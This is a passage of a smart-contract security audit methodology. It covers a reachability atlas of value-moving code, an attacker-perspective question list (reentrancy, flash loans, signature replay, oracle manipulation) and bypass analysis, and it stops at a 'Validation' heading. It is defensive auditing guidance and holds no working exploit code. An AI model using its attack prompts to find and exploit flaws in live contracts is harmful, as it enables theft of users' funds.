# Smart Contract Audit Methodology

> **Scope:** Chain-agnostic methodology for source-code-driven security audit. Discovery and validation methods are unrestricted. The bundled chain references and optional harnesses cover EVM (Solidity/Vyper), Solana (Rust/Anchor), and Sui (Move). Aptos requires its own native reference before claiming production coverage.
>
> **Historical references:** Incident names and approximate loss figures are
> orientation pointers from a dated catalog, not validation evidence. Verify a
> primary post-mortem before citing one. Patterns may recur across chains, but
> implementation primitives and exploitability do not transfer automatically.
>
> **Companion docs:** candidate acceptance and independent validation are in `triage.md`; chain-specific implementation patterns are in `metrics-evm.md`, `metrics-solana.md`, `metrics-sui.md`.

## Contents

- [First Principles](#first-principles)
- [Lens Overview](#lens-overview)
- [Methodology O: Orientation](#methodology-o-orientation-pre-pass)
- [Methodology P: Reachability Atlas](#methodology-p-reachability-atlas-optional-coverage-scaffold)
- [Hypothesis Ladder](#the-hypothesis-ladder--attacker-questions-to-ask-of-every-atlas-entry)
- [Methodology A: Bypass](#methodology-a-bypass)
- [Methodology B: Boundary Cases](#methodology-b-boundary-cases)
- [Methodology Optimizations C-H, X, J](#methodology-optimizations)
- [Optional PoC Pattern Library](#optional-poc-pattern-library--from-hypothesis-to-receipt)
- [Triage Gate](#triage-gate--from-evidence-to-finding)
- [Severity Calibration](#i-severity-calibration-post-pass)
- [Optimized Workflow](#optimized-workflow)
- [Limits](#limits)

---

## First Principles

The first two sections offer useful attack models and stances; they are not a
required discovery route. The third is the non-negotiable claim-acceptance
contract. Any discovery or validation method is allowed if its evidence supports
the exact claim.

### Axiom 1 — A Useful Chain-Shaped Exploit Model

> **Many fund-related exploits can be modeled as a reachable chain of state
> transitions from an entry point to a fund-effect sink that is unintended or
> violates a safety/economic property. This is a high-value model, not a complete
> definition of every security impact or a required search technique.**

This is the precise unit of analysis. Three things follow directly:

- For this model, the *unit* is the **chain**, not merely the function.
  Single-function review can miss bugs whose only defect is composition; a
  multi-step path may look safe at each node and become harmful only across the
  graph.
- For this model, the endpoints are an **external entry/trigger** and a
  **fund-effect sink** (transfer, mint, burn, delegatecall, balance write,
  allowance, debt creation, or another value/control effect). Other valid
  findings may concern integrity, governance, liveness, privacy, or a different
  security property without fitting this graph exactly.
- The *defect* has two forms. Structural defects are reachable chains outside the intended set. Economic-design defects are intended chains whose outcomes violate solvency, conservation, fairness, liveness, or another stated safety invariant. Documentation proves intent; it does not prove safety.

When this model is used, enumeration can produce a **candidate set** from set
difference plus an adversarial test of intended flows:
`candidates = (reachable_chains(sink) \ intended_chains(sink)) ∪ unsafe(intended_chains(sink))` for every sink in scope.

Its coverage claim is falsifiable only to the extent the reachable/intended sets
are actually bounded. The structural delta may feed A/B/X, while
`unsafe(intended)` may feed J; another method may generate the same or different
candidates directly.

### Axiom 2 — An Adversarial Stance, Not a Procedure

> **Think like the relevant threat actor and challenge intended behavior; choose
> whatever discovery method best exposes the target.**

The protocol document is intent evidence; target code, configuration, state, and
behavior determine what is actually true. A chain delta is one way to express
the gap, not the only one.

Three rules govern the stance:

1. **Treat reachability statements as claims.** "Only the admin can do X" must be
   checked against the target. An undocumented path is a lead until its threat
   model, intent, reachability, and consequence are established.
2. **Make coverage reviewable.** You cannot claim coverage for a surface you did not map or otherwise bound. Pass P is one strong map, not the only discovery method. Compiler queries, SAST, fuzzing, symbolic/formal methods, agents, manual analysis, transaction evidence, or custom approaches may establish equal or stronger coverage when their scope and blind spots are recorded.
3. **The metric catalogs are reference, not goal.** `metrics-{evm|solana|sui}.md` is a cross-reference library of past attack patterns — useful for sanity-checking a finding against historical precedent and for compounding institutional knowledge across audits. *They do not bound the audit.* If a finding matches no pattern, you may have a novel class — interrogate it harder, then add it to the catalog. If a finding matches a pattern, you have additional evidence but still no completeness guarantee.

The lenses below (O / P / A / B / C / D / E / F / G / H / X / J / I) are not a
checklist. They are optional thinking tools. High recall may come from these
lenses, agents, manual reasoning, SAST, fuzzing, formal methods, traces, custom
queries, or any combination; the audit must describe what was covered and what
remains uncertain.

### Axiom 3 — What May Count (the triage contract)

> **An agent is a search tool, not an oracle. A candidate is not a finding until evidence binds its mechanism, reachability, impact, scope, and claimed deployment state; an independent validator challenges it; deduplication and false-positive gates pass; and a human auditor accepts it.**

The acceptance relation is:

`findings = human_accept(independently_validate(evidence_bind(candidates)))`.

Use `triage/candidates.md` and per-candidate files for hypotheses and dispositions;
reserve `findings.md` for human-accepted findings. The complete lifecycle,
candidate schema, false-positive gates, multi-step evidence routing, provenance,
metrics, and validation contract are in `triage.md`, which is mandatory reading.
Candidate volume is not the product; defensible triage is.

Target truth is carried separately from discovery mechanics. `scope.md` records
the engagement boundary, while `target-lock.md` records the matching target
identity and a digest manifest of relied-on `T-NN` artifacts. Every evidence-
bearing claim names the lock SHA-256 and its exact artifact-ID subset. This
binding does not privilege or prohibit any discovery, PoC, proof, replay, model,
or validation method.

### Chain Coverage & How to Read This Document

This document is the **chain-agnostic spine** — the axioms, lenses, optional atlas framework, and self-test questions transfer across smart-contract platforms. It is written in **EVM/Solidity as the lingua franca**: the Hypothesis Ladder's 40 questions and optional PoC library are phrased in Solidity/Foundry. Transfer of principles is not proof of native implementation coverage; use chain-native semantics and evidence before claiming production completeness.

| Chain | Spine | Native ladder + PoC harnesses + atlas greps | Known-pattern catalog |
|-------|-------|----------------------------------------------|------------------------|
| EVM | ✅ | ✅ inline in this document (optional ladder, Foundry examples, and greps) | `metrics-evm.md` (dated historical pointers; verify primary sources) |
| Solana | ✅ | ✅ `playbook-solana.md` (native ladder, LiteSVM/Mollusk/fork-replay, deep greps) | `metrics-solana.md` (SlowMist-derived) |
| Sui | ✅ | ✅ `playbook-sui.md` (native ladder, `test_scenario`/localnet reconstruction, deep greps) | `metrics-sui.md` (SlowMist-derived) |
| Aptos | ✅ principles only | ❌ no native production playbook/harness | comparative notes only in `metrics-sui.md` |

**Auditing Solana or Sui:** use the chain playbook for native semantics and attack surfaces. Its ladders, greps, and harnesses are optional techniques, not required routes. Do not translate EVM primitives literally: the category mapping is conceptual, not execution-identical.

---

## Lens Overview

Metrics tell you *what patterns are known to be dangerous*. Methodologies tell you *how to find new ones*. The audit process has four layers:

| Layer | Stage | Lenses |
|-------|-------|--------|
| **Bound the attack surface** | Optional scaffold, required closure evidence | P. Reachability Atlas or another documented coverage method |
| **Build the model** | Pre-passes | C. Invariants · D. State Machines · E. Trust Boundaries |
| **Stress-test the model** | Execution | A. Bypass · B. Boundary Cases |
| **Extend the lens** | Cross-passes | F. Negative Space · G. Differential · H. Failure-Mode Catalog · X. Cross-Boundary Logic · J. Business-Logic & Economic-Design |
| **Accept output** | Triage gate | Evidence binding · scope/reachability/impact/falsification/provenance/dedup/cost-impact gates · independent validation · human acceptance |
| **Output** | Post-pass | I. Severity Calibration |

P is one way to produce reviewable closure over fund-effect chains. Grep seeds are a lower bound; any method used must state its coverage and residual blind spots. C/D/E build the mental model. A/B/F/G/H/X/J are attack lenses that may be applied to P or to leads produced by any other method. The triage gate decides what is credible; I calibrates severity for accepted candidates.

> **The composition axis.** Some high-impact bugs live *between* units — two
> functions each correct alone, two contracts each consistent alone, an
> integration with a false dependency assumption, or a mechanically sound flow
> whose economics are exploitable. **Lens X** (cross-function / cross-contract /
> cross-protocol logic) and **Lens J** (business-logic / economic-design) are
> optional prompts for those surfaces. An auditor may use X/J, another sound
> composition/economic method, or evidence that the surface is not material;
> the hard requirement is truthful coverage and claim support, not a named lens.

| Lens | Question | Surface | Historical mapping / role (EVM) |
|------|----------|---------|------------------------|
| **P. Reachability** (mechanical) | What chains reach a fund-effect, and which are unintended? | Sinks ↔ gates ↔ writes ↔ entries | Foundational — captures the chains A/B then interrogate |
| **A. Bypass** (structural) | Can the invariant be violated through a path I haven't considered? | Call graph, access control, state reachability, composition | Structural attack prompt; historical examples below |
| **B. Boundary Cases** (numerical) | Where does the math break or accounting drift? | Rounding, scaling, accounting equalities, edge values, flash-loan amplification | Numerical/economic prompt; historical examples below |

---

## Methodology O: Orientation (Pre-Pass)

> **Premise:** Mechanical enumeration without semantic understanding produces data, not findings. Before greping for sinks, force yourself to articulate what the protocol *does* in plain language. If you can't, you don't understand it well enough to attack it.

`orientation.md` is a recommended way to make tacit understanding explicit. It may be produced before, during, or after initial discovery, but final scope and evidence claims must reflect an accurate protocol model.

### O.1 The One-Paragraph Protocol Summary

Write, in your own words (not copy-pasted from docs), one paragraph answering:

- What value does this protocol create or hold? (whose money is here)
- Who is the user? Who is the operator? Who is the admin?
- What is the central economic loop? (deposit → earn → withdraw; borrow → repay; mint → burn; swap; etc.)
- What does "things going right" look like? What does "things going wrong" look like (from the protocol's perspective)?

If you cannot write this paragraph without referring back to the source, **stop and re-read the docs**. An auditor who cannot summarize the protocol cannot audit it.

### O.2 Value-Flow Diagram

For every asset the contract touches (underlying tokens, share/receipt tokens, reward tokens, NFTs, debt records), draw the in-out edges:

```
USDC depositor →(deposit)→ pool →(drawdown)→ borrower
                                ↘(income split)↘ protocol-fee / pool-owner / EA / pool-LPs
borrower →(makePayment)→ pool →(distributeLosses)→ pool-LPs (on default)
```

The diagram should make the question "if I were trying to steal this, where would I aim?" answerable in one glance.

### O.3 Storage Glossary

For every storage variable in the in-scope contracts, write a one-line gloss:

| Variable | Type | Means | Who writes | Who reads (sink-implications) |
|----------|------|-------|------------|------------------------------|
| `_totalPoolValue` | uint256 | underlying-token claim of all LPs combined | _deposit, distributeIncome, distributeLosses, withdraw | HDT.convertToShares/Assets (share-price math) → drives mint/burn/withdraw |
| `_creditRecordMapping[a].state` | enum | borrower a's credit lifecycle | _approveCredit, _drawdown, _makePayment, _updateDueInfo, triggerDefault, changeCreditLine, _initiateCredit | drawdown's auth gate, makePayment's branch dispatcher |

The storage glossary is where you spot suspicious "anyone writes, fund-effect reads" pairs *before* drawing the atlas.

### O.4 Pre-Read Red Flags (Minute Zero)

While reading source for O.1–O.3, note these structural patterns *immediately*. Each is a known accelerant for exploits; observing one does not itself establish a finding, but each demands explicit interrogation in later phases.

| Smell | What to confirm later |
|-------|------------------------|
| Upgradeable proxy with EOA admin | Phase 4.E trust map: is upgrade authority a timelock? a multisig? |
| `initialize` without `initializer` modifier or constructor-disable | Phase 6 A.8: front-run init race |
| `delegatecall` to non-immutable target | Phase 6 A.5: who can change target |
| `balanceOf(address(this))` used for security-sensitive accounting | Phase 6 B.3: are donations/rebases/direct transfers intended, and how is the balance reconciled? |
| `transfer` / `send` (fixed 2300 gas) for native value | Phase 7 H: handles smart-contract receivers? |
| Fee-on-transfer / rebasing tokens supported as `_underlyingToken` | Phase 6 B.3: pre/post balance delta |
| `tx.origin` in authorization | Phase 6 A.5: phishing trivially exploits |
| Raw `ecrecover` (not OZ ECDSA) | Phase 6 A.5: malleability + signature(0) |
| Reward / share math using `balanceOf` (not internal var) | Phase 6 B.3 + B.8: flash-loan amplifies |
| No slippage parameter on value-producing function | Phase 7; cross-reference metrics gate G-17 |
| Compiler version in CVE catalog | scripts/check-compiler.sh |
| `hardhat/console.sol` import in production | F-class informational, but also signals "dev artifacts not removed" — what else was missed? |
| Whole-struct assignment to mappings (`map[k] = StructLit(...)`) | Atlas P.3 hint: state field may be written by a line where the field name doesn't appear |
| `using X for Y` library directives | Atlas P.3 hint: library functions may mutate Y's state |

**Optional output:** `audit-workspace/{protocol}/orientation.md` containing O.1–O.4, or links to equivalent reviewable target-model evidence. If the Atlas is used without semantic context, treat its output as a regex seed rather than coverage evidence.

---

## Methodology P: Reachability Atlas (Optional Coverage Scaffold)

The atlas combines grep seeds with semantic call-graph review. It is one useful discovery/coverage method, not a mandatory path. The grep output is a **mechanical lower bound**, not proof that every fund-effect was found: unsupported syntax, inline assembly, library indirection, generated code, and novel value-transfer helpers can evade regexes. If used, close or qualify those gaps and record them in `coverage.md`. An alternative method must likewise record the surface covered, evidence, exclusions, and residual blind spots.

When using the full scaffold, its six artifacts are `sinks.md`, `gates.md`, `writes.md`, `paths.md`, `intent.md`, and `delta.md`. An audit may replace them with equivalent or stronger reviewable artifacts.

### P.1 Sink Inventory

> *What statements in the code, if executed, move value or alter accounting?*

Grep every line in scope that produces a fund-effect:

**EVM (Solidity/Vyper):**

- `safeTransfer(`, `safeTransferFrom(`, `transfer(`, `transferFrom(` — ERC-20 movement
- `_mint(`, `mint(`, `_burn(`, `burn(` — supply changes
- any call option with `{value: ...}`, `Address.sendValue`/`sendValue`, `.send(`, `.transfer(`, and `selfdestruct(` — native value movement
- every inline `assembly` block — manually inspect `call`, `callcode`, `delegatecall`, `create`, `create2`, `selfdestruct`, and direct storage accounting effects
- direct storage writes to balances, allowances, debt records, vesting schedules, accrued amounts (`balanceOf[x] =`, `allowance[x][y] =`, `debt[x] +=`, `accrued[x] =`, `unbilledPrincipal =`)
- share / receipt-token mints, burns, transfers (HDT, LP token, ERC-4626)
- `delegatecall` to any address — treat as unbounded fund-effect
- approval grants (`approve(`, `safeApprove(`, `increaseAllowance(`)

**Solana:** every `**ctx.accounts.<account>.lamports.borrow_mut()`, every `Token::transfer`, every `Token::mint_to`, every CPI to a token program.

**Sui/Move:** value movement or supply effects through `transfer::transfer` /
`transfer::public_transfer`, `coin::split` / `coin::join` / `coin::take` /
`coin::put`, `balance::split` / `balance::join` /
`balance::withdraw_all`, conversions between `Coin<T>` and `Balance<T>`,
mint/burn or supply-changing operations, and address-funds flows such as
`balance::send_funds`, `balance::redeem_funds`, and
`balance::withdraw_funds_from_object`. When it feeds authorization or value,
treat `balance::settled_funds_value` as a security-relevant read whose value is
anchored to the beginning of the current consensus commit.

For each sink, record:

| field | content |
|-------|---------|
| `id` | `S-NN` |
| `file:line` | exact location |
| `containing fn` | function symbol |
| `effect` | direction + asset + amount expression |
| `local preconds` | every `require`, `if-revert`, modifier on the containing function |
| `state-reads` | every field/mapping the function reads before the sink |

**Output:** `audit-workspace/{protocol}/atlas/sinks.md`.

### P.2 Gate-Read Inventory

> *What state values does the code use as authorization, and what does each value unlock?*

Grep every branch that reads a state field for control flow:

- `if (X == ...)`, `if (X != ...)`, `require(X ...)`, `assert(X ...)`
- ternary expressions, switch/match dispatch
- modifier checks (`onlyOwner` resolves to `owner == msg.sender`)
- enum-state comparisons (`cr.state == Approved`)

For each gate-read, record:

| field | content |
|-------|---------|
| `id` | `G-NN` |
| `file:line` | exact location |
| `containing fn` | function symbol |
| `field read` | storage path (`creditRecord[borrower].state`) |
| `branch unlocked` | what action becomes callable when the branch is true |

**Output:** `audit-workspace/{protocol}/atlas/gates.md`.

### P.3 Gate-Write Inventory

> *Every field referenced in gates.md is an authorization channel. List every line that writes to it.*

For each field in `gates.md`, grep every assignment:

- `<field> =`, `.<field> =`, mapping writes (`mapping[x] = ...`), nested struct overwrites (`mapping[x] = NewStruct(...)` — easy to miss because the field name doesn't appear literally)
- helper setters (`_setFoo(`, `updateState(`)
- assembly storage writes (`sstore`)
- delegatecall-reachable writes via inherited contracts
- initializer / constructor writes

For each write, record:

| field | content |
|-------|---------|
| `id` | `W-NN` |
| `file:line` | exact location |
| `containing fn` | function symbol |
| `from-values` | which prior values of the field reach this write (often "any") |
| `to-value` | the new value written |
| `local preconds` | every `require`/`modifier`/`if-revert` on the containing function |
| `caller class` | one of {permissionless, role-gated, internal-only, callback, init} |
| `external reach` | which external entry points call this function (direct or transitively) |

**Candidate signal:** if a write has `caller class = permissionless` and writes a
`to-value` referenced as the unlock in `gates.md`, investigate a possible
authorization back-channel. The write/gate shape alone does not establish
reachability, unintended authority, impact, or severity.

**Output:** `audit-workspace/{protocol}/atlas/writes.md`.

### P.4 Reachable-Path Enumeration

> *For each sink, which entry sequences can the selected analysis establish,
> and what reachable space may remain unmodeled?*

For each `(S-NN, external-entry-point)` pair, walk forward through the call graph and **conjoin** every local precondition encountered along the path. The result is a logical conjunction `entry(args) ∧ gate_1 ∧ gate_2 ∧ ... → sink`.

For every gate in the conjunction that reads a field tracked in `gates.md`:

1. Look up the writes for that field in `writes.md`.
2. For each write, recursively trace which entries reach it.
3. Compose the supported paths into the reachable set under the recorded model.
   Dynamic dispatch, assembly, generated code, off-chain triggers, environment
   behavior, and analysis limits may leave blind spots; record them rather than
   claiming completeness.

For each sink, output the union of established entry-sequences and its modeling
limits:

```
S-01 (vault native-value payout to caller)
  reachable via:
    [deposit -> withdraw -> mark-withdrawn -> sendValue]                 ← intended
    [deposit -> withdraw -> sendValue -> receive callback
             -> reenter withdraw -> second sendValue]                   ← unintended (P.5)
    [authorized emergency withdrawal -> sendValue]                       ← intended
```

**Output:** `audit-workspace/{protocol}/atlas/paths.md`. One section per sink.

### P.5 Intent Specification & Delta

> *Which of the reachable chains does the protocol team intend? Anything else is a triage candidate.*

From whitepaper, docs, code comments, function NatSpec, and naming:

- For each privileged actor (owner, EA, oracle, governance, …), list which entries they are intended to call and what state they are intended to produce.
- For each fund-effect sink, list the intended actors and intended preconditions.

Set difference per sink: `reachable_set(S-NN) \ intended_set(S-NN)` = candidate chains. Map each material delta entry to a `C-NN` triage candidate and establish it with any sound evidence method before independent triage.

**Output:** `audit-workspace/{protocol}/atlas/intent.md` and `audit-workspace/{protocol}/atlas/delta.md`.

When this scaffold is used, the delta is one structural search deliverable. The complete candidate set may also include unsafe intended flows and leads from any other method; only independently validated, human-accepted candidates form the finding set.

### P.6 Atlas Discipline

- If Atlas inventories support a coverage claim, keep them reviewable and reconcile newly discovered sinks/gates/writes; otherwise record the limitation or point `coverage.md` to the stronger replacement evidence.
- Treat a permissionless write to a security-sensitive gating field as a
  high-priority lead until its reachable effects and intended authorization are
  established. Do not assign severity from the write-site alone.
- Reassess affected coverage after every code change. Re-running P is one option when the Atlas was the selected method; another sound incremental or full method is equally valid.

### P.7 Validation

- **Hundred Finance / Onyx / Channels** — `accrueInterest` (permissionless) recomputes per-market state; downstream `borrow` reads that state as a "market is healthy" gate. Permissionless write to a gating field.
- **Nomad** — an upgrade initialized the committed root to zero and wrote a non-zero confirmation value for that root. `process` later checked `acceptableRoot(messages[messageHash])`; because an unproven message's mapping value was also zero, it inherited the now-trusted zero-root status. P.3 + P.2 can surface the collision when the init write is listed next to the runtime gate read.
- **General pattern (recurs across credit / vesting / order / message lifecycles):** a permissionless refresh/accrue/tick/settle helper writes an authorization-gate value as part of its bookkeeping default branch. The privileged setter is well-guarded; the bookkeeping helper is not — and downstream sinks gate only on the field value, not on the write-site.

---

## Optional Hypothesis Ladder — Adversarial Prompts

The questions below provide attack vocabulary when useful. They are prompts, not a required checklist or search order. Apply any subset that fits the target and use other discovery methods freely; every material lead enters the same evidence and triage contract.

> **Chain note:** The questions below use EVM vocabulary. Solana and Sui
> playbooks provide optional native prompts and chain-specific semantics. Their
> categories overlap conceptually but are not one-to-one translations; classify
> each candidate by the actual primitive and mechanism on its target chain.

### Identity & Authorization

1. **Can `msg.sender` actually become the contract itself?** Trace explicit external self-calls (`this.f(...)`, `address(this).call(...)`) and call chains that make the contract call back into itself. A dependency callback normally makes the dependency—not this contract—the caller, so callback support alone does not establish self-sender reachability. Under `delegatecall`, `address(this)` denotes the current proxy/address context while `msg.sender` is preserved; evaluate the exact address comparison and call opcode.
2. **What if `msg.sender` is the target of a different external call?** Cross-contract reentrancy: another contract in the protocol re-enters during the external call window.
3. **What if `msg.sender` is a contract I deployed with a `fallback` that re-enters?** Reentrancy / cross-function reentrancy.
4. **What caller context does a multicall / aggregate / forwarder create?** A CALL-based external aggregator becomes `msg.sender` at the target. A self-`delegatecall` multicall normally preserves `msg.sender` and `msg.value`, though its calldata/context handling may introduce separate bugs. An ERC-2771 recipient should authorize the signer recovered by `_msgSender()` only after binding a trusted forwarder; mixing forwarded calldata with self-`delegatecall` requires version-specific review. Trace the actual opcode and context abstraction instead of assuming one batch behavior.
5. **Can I become msg.sender by deploying to a deterministic CREATE2 address that the protocol pre-approved?** Sybil-via-address pre-image.
6. **Is authorization done by `msg.sender` value vs. a parameter the attacker provides?** If a function takes `address borrower` and the borrower's record gates the action, calling `act(victim)` may use victim's allowance but credit attacker.
7. **Is there a way to *become* a privileged role via accidentally-callable functions?** Open initializers, role grants without modifier, `_grantRole` reachable through inheritance.

### State Manipulation

8. **Can I get into a state the team thinks is unreachable?** If a state-machine
   matrix is available, inspect states with multiple or permissionless writers as
   leads; severity depends on the reachable consequence, actor, and cost.
9. **Can I write a gating field via a bookkeeping helper rather than the privileged setter?** "Promote-on-refresh" — `accrue/tick/settle/refresh` that defaults the field to a happy-path value.
10. **Can I make a "Deleted" or "Defaulted" record act fresh again?** Default-state-reset bugs: a record that should remain terminal becomes reusable.
11. **Is there a window between two writes where state is inconsistent and reachable?** CEI violations; partial multicall.
12. **Can I write the same record twice in one tx and have the second one "stick" past a check?** Initialization race; nonce-reuse.

### Numeric Boundary

13. **What if amount == 0?** Often slipped through `require(amount > 0)`; downstream code may divide by zero, mint zero shares, or compute negative correction.
14. **What if amount == type(uint256).max?** Approval-infinite paths can multiply through to overflow even with 0.8 panics.
15. **What if amount == 1 wei?** Rounding to zero — shares minted = 0, but USDC deducted — silent loss; or shares burned = 0, but full underlying paid.
16. **What if totalSupply == 0 but totalAssets > 0 (or vice versa)?** Pool wiped to zero by losses; fresh deposits revive stale shareholders (or get diluted to zero).
17. **What if I deposit immediately before a reward distribution / snapshot / interest accrual?** Earn rewards for the same block I deposited in.
18. **Is the complete round trip profitable after rounding, fees, exchange-rate movement, and token behavior?** A user-favoring result on one leg does not establish a leak if another leg or fee offsets it. Evaluate the net attacker gain and matching protocol/user loss over the full reachable sequence, including repeated dust operations where relevant.

### Token / External Call

19. **What if the token is fee-on-transfer / rebasing?** `transferFrom(x, this, n)` credits `<n`; donation drift; rebasing changes balance silently.
20. **What if I pass the protocol's own token / pool / vault as a parameter?** Self-reference can collapse swap math, double-credit balances, infinite-loop liquidations.
21. **What if I pass a malicious ERC-20 with a re-entering `transfer`?** Reentrancy class.
22. **What if the underlying token's transfer reverts mid-loop?** DoS or skipped iteration with state already mutated.
23. **What if the oracle returns 0 / stale / a wildly off price?** Liquidation cascades, mint-against-fake-collateral, withdraw-everything-via-share-inflation.
24. **What if the chainlink answeredInRound < roundId, or updatedAt is zero?** Stale-feed acceptance.

### Composition / MEV

25. **What if I flash-loan to satisfy the precondition?** Solvency check at moment of call; governance vote by `balanceOf` snapshot at proposal-execution-time; share-price-dependent mint.
26. **What if I sandwich my own action?** Front-run setting fee=0, take action, back-run setting fee=max — extract fee-share.
27. **Can I deposit just before a withdrawal lockout countdown reset, then re-deposit dust to extend the victim's lockout?** Lockout-griefing.
28. **Can I forge a signature that a relayer will replay?** Missing nonce / chainId / domain separator.
29. **Can I make this op cost the gas refund (selfdestruct historical) or a known opcode-specific quirk?** L1/L2 gas asymmetry — what's free on L1 is metered on L2.

### Liveness / Lock

30. **Can I make a withdraw / payment / claim path permanently revert?** Auto-revert assertions, unbounded loops, dependence on a now-removed integration.
31. **Can I park a record into a state where no one (including admin) can clear it?** The `assert(periodsPassed <= MAX)` class.

### Cross-Boundary & Business Logic

32. **If I call two functions in one tx (or across two txs), can I land in a state neither permits alone?** Cross-function seam (X.1) — shared invariant maintained only if called in a specific order.
33. **Is there a stored value that is a copy/derivation of another stored value?** If a write to the source skips updating the cache, the two desync (X.1). Reward-debt / `storedExchangeRate` / snapshot class.
34. **Do two contracts track the "same" quantity?** Which one do sinks read, and can I move the *other* one to desync them (X.2)? Vault vs strategy, manager vs pool.
35. **Does this function assume "only contract B calls me" without checking `msg.sender == B`?** If so, I call it directly (X.2). Also: is B's address immutable, or settable/upgradeable?
36. **Does the code read an external `view` (`get_virtual_price`, `getRate`, `convertToAssets`, spot reserves) as ground truth?** Can I move it within the tx via flash loan or read-only reentrancy (X.3)? Conic / Sentiment class.
37. **Did the protocol assume the wrong semantics of a dependency** — fresh oracle, non-reentrant pool, 18 decimals, standard ERC-20, immutable proxy (X.3)?
38. **Can a rational actor extract value using the *intended* flow** — deposit-before-distribution, JIT liquidity, claim-then-exit, flash-loaned vote weight (J)?
39. **Does the implemented fee/reward/interest math match the documented economics?** A formula that compiles but distributes wrong is a J candidate.
40. **Can I grief cheaply** — extend someone's lockout, spam a queue, force an unbounded loop, dust-donate to break first-depositor math (J)? Or does a liquidation/penalty incentive misfire (no liquidators → bad debt, or over-liquidation)?

### Treat each "yes" as a hypothesis

For every material lead from the ladder or any other method, produce a schema-complete per-candidate file under `triage/candidates/`; never put unvalidated hypotheses in `findings.md`. Name the target/revision/configuration, threat actor/entry and required capabilities, invariant, mechanism/reachability evidence, impact criterion, falsification/control, verification manifest, dedup key, owner/provenance, and status. Rebuild the generated `triage/candidates.md` index with `triage-index.sh`.

---

## Methodology A: Bypass

For every state transition the code intends to enforce, ask: *is there any path that produces the resulting state without honoring the precondition?* When used, A may consume Atlas output, ladder leads, traces, formal models, query results, manual analysis, or candidates from any other method.

### A.1 Entry-Point Inventory

Enumerate every external/public function. Group by privilege:

- **Unprivileged** — callable by anyone. This is one important attack surface;
  privileged, economic, dependency, governance, and liveness threat models may
  be equally material.
- **Owner / Role** — name the modifier; resolve the caller to a concrete address; check whether the caller can be reached indirectly (proposal, callback, hook).
- **Contract-callback** — `onTokenTransfer`, `uniswapV3SwapCallback`, ERC-777/1155/721 hooks, custom flash-loan callbacks. Treat each as adversarially reachable until the implementation binds the caller to the expected dependency and binds callback data, initiator, amount, and phase to a live operation. A correctly authenticated callback is not automatically permissionless; a public-by-design callback remains so.
- **Internal-but-reachable** — `internal` functions reachable via library-binding (`using A for B`) or via inheritance that exposes them through a child.

**Solana adaptation:** instruction handlers + their account context; signer/writable/readonly classification of each account; CPI targets.
**Move adaptation:** public entry functions + capability-gated functions; objects passed by value/ref/&mut.

### A.2 Input Validation Completeness

For every parameter on every entry point, enumerate the trusted range and the actual validation. **Missing validation is the candidate mechanism** — build the table from the *type*, not from the checks already present (negative-space discipline). For each parameter, write `(name, type, trusted range the code assumes, validation actually present, gap)`. A populated "gap" cell becomes a candidate only after the triage schema is complete.

Test each parameter at:

- `0` / empty / zero-address / empty bytes / zero-length array
- max value and max-1; `type(uint).max` as the "infinite/sentinel" value
- attacker-controlled contract vs EOA (where caller type matters)
- duplicates / collisions across array inputs; **unequal array lengths** on paired arrays (`tokens[]` vs `amounts[]`)
- self-reference (input address == caller, token == output token, pool == output pool, `from == to`, `receiver == address(this)`)
- maliciously crafted calldata for raw `bytes` / variadic parameters / nested ABI-encoded payloads that are re-decoded downstream
- **enum / index out of range** — a `uint8` cast to an enum, or an array index, beyond the defined set (reverts, or silently selects the wrong branch on older compilers)
- **address-type confusion** — an address that is supposed to be a known token/pool/role but is attacker-deployed (passes `code.length > 0` but lies); a parameter the protocol uses as a *trusted* address with no allowlist
- **decimals / unit assumptions on a passed token** — code assumes 18 decimals or a fixed scaling for a caller-supplied token
- **signature-bearing params** — `(v,r,s)` / `bytes signature` / `deadline` / `nonce`: check malleability, signer-not-validated, missing domain separator/chainId, replay (links to A.5 and ladder Q28)
- **"trusted struct" inputs** — a calldata struct whose fields the code reads as authority (`Order`, `Permit`, `Route`) without re-deriving them on-chain

For an accepts-invalid-input hypothesis, rejection can falsify that mechanism;
silently clamped, ignored, or trusted values remain leads. Rejection is not
universally safe: valid-input rejection or attacker-triggered reverts may still
create liveness, griefing, or integration failures. Verify the actual consequence.

### A.3 State-Change Reachability

For every privileged state mutation, enumerate *every* code path that reaches it. A second path through callback, hook, delegated call, multicall, or batch is a candidate until its caller context and equivalent preconditions are established.

- Trace backward from the mutation to all callers
- Treat `multicall` / `aggregate` / `batch` as path multiplexers and resolve their actual CALL, `delegatecall`, forwarding, and context behavior. Wrapper authorization may or may not constrain each inner target; do not assume propagation or bypass
- Hook lifecycles may reach internals the user-callable surface does not

### A.4 Combined-Call Composition

Treat preconditions as "what holds across a transaction," not "what holds at function entry." The attacker can:

- Establish balance via flash loan
- Establish position via deposit immediately before
- Establish price via swap in same block
- Establish governance vote via flash-loan + checkpoint
- Establish state via `multicall` sequence that violates intermediate invariants between calls

For every function, ask: *what is the attacker's cheapest setup to satisfy the precondition adversarially?*

### A.5 Access Control Reachability

For each privileged modifier, list every actor that reaches the protected operation:

- Direct caller
- Timelock-proposal executor
- Multisig signer set
- Inherited role admin
- Hook-installed contract
- Delegate-called caller
- Front-runnable initializer

Concentrated voting power, hot signing keys, and "emergency" roles are equivalent to lower-privilege paths in adversarial analysis.

### A.6 External Call Dependency

For each external call, list assumptions. Each violated assumption is a bypass:

- Return value honesty (USDT returns nothing — `SafeERC20`)
- Gas consumption upper bound (no out-of-gas grief on critical paths)
- State visibility during callback (read-only reentrancy class)
- Caller-vs-`tx.origin` semantics
- Reentrancy classification (same-contract / cross-function / cross-contract / read-only)
- Idempotency (rebasing, fee-on-transfer)

### A.7 State-As-Authority Back-Channel

When a function reads a state field (`status`, `state`, `phase`, `role`, `approved`, `verified`, `paid`) and treats one of its values as the authorization gate (e.g., "if `state == GoodStanding` then trust this call"), then *every code path that can write that value becomes an authorization surface* — even paths that look like bookkeeping.

Checklist:

1. **Read-sites:** For each access-gating branch on a state value (`if (state == X)`, `require(state == Y)`, switch/enum dispatch), list which downstream actions are unlocked.
2. **Write-sites:** Grep every assignment to the same field (`state =`, `<mapping>[id].state =`, `_setState(...)`, `enum.<Member>`). Many fields are written in 5–10 distinct places.
3. **Transition matrix:** For each (from-state × to-state) pair, list which write-site reaches it AND what guard that write-site enforces. Cross off transitions that are intended; the remaining cells are suspect.
4. **Auth-gate inversion test:** For each downstream action gated by `state == X`, ask: can ANY write-site reach `X` without satisfying the gate the protocol team thinks is required to reach `X`?

A common subclass: a permissionless "refresh," "update," "settle," or "tick" function that recomputes derived state and writes a default value (e.g., always-`Active` if not-late) — silently promoting a not-yet-approved record to a callable one. Find these by listing every external function that calls into the same internal mutation routine the privileged caller uses.

*Validation:*

